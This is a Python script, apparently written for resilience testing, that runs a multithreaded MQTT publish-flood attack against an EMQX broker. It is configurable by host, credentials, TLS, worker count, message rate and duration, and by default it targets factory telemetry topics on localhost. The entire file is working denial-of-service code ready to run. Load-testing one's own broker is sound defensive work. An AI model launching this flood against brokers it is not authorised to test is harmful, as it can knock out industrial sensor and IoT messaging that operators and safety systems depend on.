#!/usr/bin/env python3
"""
MQTT Publish Flood Attack Script (Windows Compatible)
=====================================================
Simulates a publish flood attack to test EMQX rate limiting and resilience.
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
from datetime import datetime, timezone

class PublishFloodAttack:
    def __init__(self, broker_host="localhost", broker_port=1883, 
                 username=None, password=None, use_tls=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.username = username
        self.password = password
        self.use_tls = use_tls
        self.clients = []
        self.attack_stats = {
            "messages_sent": 0,
            "messages_failed": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }
        
    def create_client(self, client_id):
        """Create MQTT client with security settings"""
        try:
            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            
            if self.username and self.password:
                client.username_pw_set(self.username, self.password)
            
            if self.use_tls:
                client.tls_set()
            
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None
    
    def flood_worker(self, worker_id, num_messages, topics, delay_ms=0):
        """Worker thread for flood attack"""
        client_id = f"flood_attacker_{worker_id}"
        client = self.create_client(client_id)
        
        if not client:
            self.attack_stats["connections_failed"] += 1
            return
        
        try:
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            
            print(f" Worker {worker_id}: Connected, starting flood attack...")
            
            # Send flood messages
            for i in range(num_messages):
                try:
                    # Random topic selection
                    topic = random.choice(topics)
                    
                    # Generate random payload
                    payload = {
                        "attack_type": "publish_flood",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "random_data": random.randint(1000, 9999),
                        "flood_payload": "A" * random.randint(100, 1000)  # Variable size payload
                    }
                    
                    # Publish message
                    result = client.publish(topic, json.dumps(payload), qos=0)
                    
                    if result.rc == 0:
                        self.attack_stats["messages_sent"] += 1
                    else:
                        self.attack_stats["messages_failed"] += 1
                    
                    # Delay between messages
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)
                    
                    # Progress indicator
                    if i % 100 == 0:
                        print(f" Worker {worker_id}: Sent {i}/{num_messages} messages")
                        
                except Exception as e:
                    self.attack_stats["messages_failed"] += 1
                    if i % 100 == 0:  # Don't spam errors
                        print(f" Worker {worker_id}: Error sending message {i}: {e}")
            
            print(f" Worker {worker_id}: Completed {num_messages} messages")
            
        except Exception as e:
            print(f" Worker {worker_id}: Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass
    
    def launch_attack(self, num_workers=5, messages_per_worker=1000, 
                     topics=None, delay_ms=0, duration_seconds=None):
        """Launch publish flood attack"""
        if topics is None:
            topics = [
                "factory/tenantA/Temperature/telemetry",
                "factory/tenantA/Humidity/telemetry", 
                "factory/tenantA/Motion/telemetry",
                "factory/tenantA/CO-Gas/telemetry",
                "factory/tenantA/Smoke/telemetry",
                "attack/flood/test",
                "system/performance/test",
                "security/test/flood"
            ]
        
        print(f" Starting Publish Flood Attack")
        print(f"   Workers: {num_workers}")
        print(f"   Messages per worker: {messages_per_worker}")
        print(f"   Total messages: {num_workers * messages_per_worker}")
        print(f"   Delay: {delay_ms}ms")
        print(f"   Topics: {len(topics)}")
        print("=" * 60)
        
        self.attack_stats["start_time"] = time.time()
        
        # Create worker threads
        threads = []
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.flood_worker,
                args=(i, messages_per_worker, topics, delay_ms)
            )
            threads.append(thread)
        
        # Start all workers
        for thread in threads:
            thread.start()
        
        # Monitor attack
        try:
            if duration_seconds:
                print(f"  Attack will run for {duration_seconds} seconds...")
                time.sleep(duration_seconds)
                print("  Stopping attack after duration limit...")
            else:
                # Wait for all workers to complete
                for thread in threads:
                    thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")
        
        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()
    
    def print_attack_stats(self):
        """Print attack statistics"""
        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        total_messages = self.attack_stats["messages_sent"] + self.attack_stats["messages_failed"]
        
        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Messages sent: {self.attack_stats['messages_sent']}")
        print(f"Messages failed: {self.attack_stats['messages_failed']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Success rate: {(self.attack_stats['messages_sent']/total_messages*100):.1f}%" if total_messages > 0 else "N/A")
        print(f"Messages per second: {self.attack_stats['messages_sent']/duration:.1f}" if duration > 0 else "N/A")

def main():
    parser = argparse.ArgumentParser(description="MQTT Publish Flood Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--tls", action="store_true", help="Use TLS connection")
    parser.add_argument("--workers", type=int, default=5, help="Number of worker threads")
    parser.add_argument("--messages", type=int, default=1000, help="Messages per worker")
    parser.add_argument("--delay", type=int, default=0, help="Delay between messages (ms)")
    parser.add_argument("--duration", type=int, help="Attack duration in seconds")
    parser.add_argument("--topics", nargs="+", help="Custom topics to attack")
    
    args = parser.parse_args()
    
    # Create attack instance
    attack = PublishFloodAttack(
        broker_host=args.broker,
        broker_port=args.port,
        username=args.username,
        password=args.password,
        use_tls=args.tls
    )
    
    # Launch attack
    attack.launch_attack(
        num_workers=args.workers,
        messages_per_worker=args.messages,
        topics=args.topics,
        delay_ms=args.delay,
        duration_seconds=args.duration
    )

if __name__ == "__main__":
    main()
